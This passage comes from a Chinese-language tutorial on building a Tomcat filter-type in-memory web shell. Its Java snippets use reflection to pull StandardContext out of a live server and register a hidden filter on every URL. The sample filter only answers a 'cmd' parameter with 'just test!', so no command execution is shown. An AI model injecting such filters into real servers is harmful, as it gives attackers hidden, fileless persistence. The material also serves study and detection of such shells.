新手第一次自己搭建环境的话，可能会遇到一些问题，这里我们一个一个来说。

![](../Images/bd1b1a5e3f514b42f1d68e9a2543ece8.png "aa.jpg")

```

      <version\>8.5.39</version\>
```

**0x03 编写自己的内存shell**

  

通过上面的一顿分析，我们已知的点为

*   Filter的创建在org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法中
    
*   StandardContext是核心对象
    
*   filterMaps集合存放着所有的FilterMap对象
    
*   filterConfigs集合通过指定filterName对应的ApplicationFilterConfig
    

  

有了以上的总结，我们的思路就会清晰很多，首先我们要做的就是模仿服务器创建Filter的流程，也就是模仿org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法。

  

然后我们就需要倒着推导创建自定义的Filter需要哪些步骤以及哪些对象，从盘点中知道，核心点在StandardContext对象，和新方法为createFilterChain，那么我们就从该方法看起，如图

![](../Images/77469d9b12d411a20c689c02d3f01d87.png "15.jpg")

  

已知filterConfig就是最终生成的Filter，由此开始倒推，filterConfig从哪来？不难看出filterConfig是从StandardContext中获取到的，使用的是findFilterConfig方法，刚刚也看过该方法，是从filterConfigs集合中根据filterName来获取ApplicationFilterConfig对象的，所以由此可知，我们需要在filterConfigs中存入一个自定义的键值对，key为filterName，value为ApplicationFilterConfig对象。然后还需要在StandardContext中存入一个自定义的FilterMap对象，因为要调用filterMap.getFilterName()获取自定义的filterName。

  

继续往下推导，ApplicationFilterConfig对象如何创建？查看一下该类的构造方法，如图

![](../Images/936ce064cd747c52b915ad5af55ef351.png "16.jpg")

  

可以看到只有一个默认的构造方法，默认修饰符一般只有同一包中才能访问调用，不过无伤大雅，我们可以通过反射强制获取该构造方法，然后创建对象。构造方法中应该传入两个参数，一个是Context对象，也就是StandardContext，因为该类是Context的实现类，还有一个就是FilterDef对象。根据上面的分析，我们需要单独创建一个StandardContext对象以及FilterDef对象。

  

通过上面详细分析，我们得出以下结论

*   需要一个StandardContext对象
    
*   需要一个ApplicationFilterConfig对象
    
*   需要一个FilterMap对象
    
*   需要一个FilterDef对象
    

  

分析完了，那么就开干吧，StandardContext对象我们可以通过以下代码来获取

```
    ServletContext servletContext \= request.getSession().getServletContext
();    out.print(servletContext
);    Field f \= servletContext.getClass().getDeclaredField("context"
);    f.setAccessible(true
);    ApplicationContext appCtx \= (ApplicationContext) f.get(servletContext
);    f \= appCtx.getClass().getDeclaredField("context"
);    f.setAccessible(true
);    StandardContext standCtx \= (StandardContext) f.get(appCtx);
```

  

通过反射的方式来获取运行阶段的StandardContext对象，这时先创建我们的自定义过滤器对象，代码如下

```
Filter filter \= new Filter
() {        @Override
        public void init(FilterConfig filterConfig) throws ServletException
 {
        }        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException
 {            HttpServletRequest req \= (HttpServletRequest) servletRequest
;            HttpServletResponse resp \= (HttpServletResponse) servletResponse
;            if(req.getParameter("cmd") != null
) {                resp.getWriter().write("just test!"
);
            }            filterChain.doFilter(req, resp
);
        }        @Override
        public void destroy
() {
        }    };
```

  

然后就是将创建FilterDef，代码如下

```
    FilterDef filterDef \= new FilterDef
();    filterDef.setFilterName(name
);    filterDef.setFilterClass(filter.getClass().getName
());    filterDef.setFilter(filter);
```

  

这里的name为我们自定义的filter名称，随意

  

创建后FilterDef后就是创建FilterMap了，并且将FilterMap添加到StandardContext对象中，代码如下

```
    FilterMap filterMap \= new FilterMap
();    filterMap.setFilterName(filterDef.getFilterName
());    filterMap.addURLPattern("/\*"
);    standCtx.addFilterMapBefore(filterMap);
```

  

这里是的是addFilterMapBefore方法，该方法的作用是将FilterMap添加到的一个的位置，因为过滤器链是有执行顺序的，这样就可以实现每次访问就先执行我们自定义的过滤器。

  

然后就是创建ApplicationFilterConfig对象了，代码如下

```
    Constructor cons \= ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class
);    cons.setAccessible(true
);    ApplicationFilterConfig filterConfig \= (ApplicationFilterConfig) cons.newInstance(standCtx, filterDef);
```

  

这些都创建出来之后，还记得我们上面最后的分析吗，要将指定的key和value添加到filterConfigs集合中，想要使用filterConfigs，那就得先获取才行，代码如下

```
    f \= standCtx.getClass().getDeclaredField("filterConfigs"
);    f.setAccessible(true
);    Map filterConfigs \= (Map) f.get(standCtx
);    filterConfigs.put(name, filterConfig); // 最后添加filterName和filerConfig到filterConfigs集合中
```

  

为什么最后要做这一步操作呢？那是因为，在filterChain.addFilter(filterConfig)中，filterConfig是从filterConfigs集合中获取的，所以必须要添加进去，等到下一次调用org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法的时候，就能获取到我们自定义的过滤器了，说明一下，org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法，在每次请求的时候，都会被调用。
